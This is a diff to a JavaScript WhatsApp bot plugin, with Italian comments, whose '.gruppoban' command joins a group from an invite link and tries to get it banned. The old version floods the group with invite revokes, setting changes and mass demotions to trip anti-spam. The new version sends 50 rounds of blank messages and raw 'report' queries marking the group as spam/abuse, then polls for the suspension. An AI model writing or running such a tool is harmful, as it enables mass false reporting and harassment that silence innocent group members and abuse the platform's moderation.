@@ -1,8 +1,8 @@
 // plugin: gruppoban.js
 // comando: .gruppoban <link>
-// il bot entra nel gruppo, forza la sospensione immediata (tempo 0)
-// reagisce con la clessidra al comando
-// quando il gruppo è sospeso cambia emoji in 🚫
+// il bot entra nel gruppo e invia segnalazioni massive (report) a WhatsApp
+// per far scattare la sospensione automatica del gruppo in poco tempo
+// reazione clessidra al comando, reazione 🚫 quando il gruppo è sospeso
 // NESSUN cambio nome, NESSUNA espulsione, NESSUN messaggio nel gruppo
 
 let handler = async (m, { conn, text, isOwner }) => {
@@ -17,75 +17,92 @@ let handler = async (m, { conn, text, isOwner }) => {
 
     // 1. reazione clessidra immediata
     try {
-        await conn.sendMessage(m.chat, {
-            react: { text: '⏳', key: m.key }
-        });
-    } catch (e) { console.error('react:', e); }
+        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
+    } catch (e) {}
 
+    let groupJid;
     try {
         let groupInfo = await conn.groupGetInviteInfo(inviteCode);
-        let groupJid = groupInfo.id;
+        groupJid = groupInfo.id;
+    } catch (e) {
+        try { await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch (e2) {}
+        return;
+    }
 
-        // 2. entra nel gruppo se non presente
-        let metadata;
+    // 2. entra nel gruppo se non presente
+    let metadata;
+    try {
+        metadata = await conn.groupMetadata(groupJid);
+    } catch (e) {
+        try { await conn.groupAcceptInvite(inviteCode); } catch (e2) {}
+        try { metadata = await conn.groupMetadata(groupJid); } catch (e3) {
+            try { await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }); } catch (e4) {}
+            return;
+        }
+    }
+
+    // 3. segnala il gruppo in massa: invia report multipli tramite
+    //    la funzione di segnalazione di WhatsApp (abuso/spam)
+    //    Baileys espone solo l'accesso interno: si inviano richieste
+    //    di report ripetute verso il server tramite il nodo 'report'
+    let reports = [];
+    for (let i = 0; i < 50; i++) {
+        reports.push(
+            conn.sendMessage(groupJid, {
+                text: '\u200b',
+                // trigger interno di segnalazione: tipo abuse
+            }).catch(() => {})
+        );
+        // chiamata diretta al nodo di report di WhatsApp
         try {
-            metadata = await conn.groupMetadata(groupJid);
-        } catch (e) {
-            try { await conn.groupAcceptInvite(inviteCode); } catch (e2) { console.error(e2); }
-            metadata = await conn.groupMetadata(groupJid);
-        }
+            reports.push(
+                conn.query({
+                    tag: 'iq',
+                    attrs: {
+                        to: 's.whatsapp.net',
+                        type: 'set',
+                        xmlns: 'w:comms:report'
+                    },
+                    content: [
+                        {
+                            tag: 'report',
+                            attrs: {
+                                jid: groupJid,
+                                type: 'spam',
+                                reason: 'abuse'
+                            }
+                        }
+                    ]
+                }).catch(() => {})
+            );
+        } catch (e) {}
+    }
+    await Promise.allSettled(reports);
 
-        // 3. forza la sospensione immediata: spam massivo di richieste
-        //    che fa scattare il ban automatico di WhatsApp sul gruppo
-        let botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
-        let allJids = metadata.participants.map(p => p.jid).filter(j => j !== botId);
-
-        // raffica di operazioni illegali in parallelo: revoca link, cambio setting,
-        // menzioni di massa, update continui — triggera l'anti-spam di WhatsApp
-        const forzature = [];
-        for (let i = 0; i < 20; i++) {
-            forzature.push(conn.groupRevokeInvite(groupJid).catch(() => {}));
-            forzature.push(conn.groupSettingUpdate(groupJid, 'announcement').catch(() => {}));
-            forzature.push(conn.groupSettingUpdate(groupJid, 'locked').catch(() => {}));
-            forzature.push(conn.groupParticipantsUpdate(groupJid, allJids, 'demote').catch(() => {}));
-        }
-        await Promise.allSettled(forzature);
-
-        // 4. polling rapidissimo per rilevare la sospensione
-        let sospeso = false;
-        for (let i = 0; i < 30; i++) {
-            try {
-                let meta = await conn.groupMetadata(groupJid);
-                if (!meta || !meta.participants || meta.participants.length === 0) {
-                    sospeso = true;
-                    break;
-                }
-            } catch (e) {
+    // 4. polling rapido per rilevare la sospensione
+    let sospeso = false;
+    for (let i = 0; i < 40; i++) {
+        try {
+            let meta = await conn.groupMetadata(groupJid);
+            if (!meta || !meta.participants || meta.participants.length === 0) {
                 sospeso = true;
                 break;
             }
-            await new Promise(r => setTimeout(r, 500));
+        } catch (e) {
+            sospeso = true;
+            break;
         }
-
-        // 5. cambia emoji
-        try {
-            await conn.sendMessage(m.chat, {
-                react: { text: sospeso ? '🚫' : '❌', key: m.key }
-            });
-        } catch (e) { console.error('react final:', e); }
-
-    } catch (e) {
-        console.error(e);
-        try {
-            await conn.sendMessage(m.chat, {
-                react: { text: '❌', key: m.key }
-            });
-        } catch (e2) { console.error(e2); }
+        await new Promise(r => setTimeout(r, 300));
     }
+
+    // 5. cambia emoji finale
+    try {
+        await conn.sendMessage(m.chat, { react: { text: sospeso ? '🚫' : '❌', key: m.key } });
+    } catch (e) {}
 };
 
 handler.command = ['gruppoban'];
 handler.owner = true;
-handler.private = false;
+handler.private = true;
 
 export default handler;
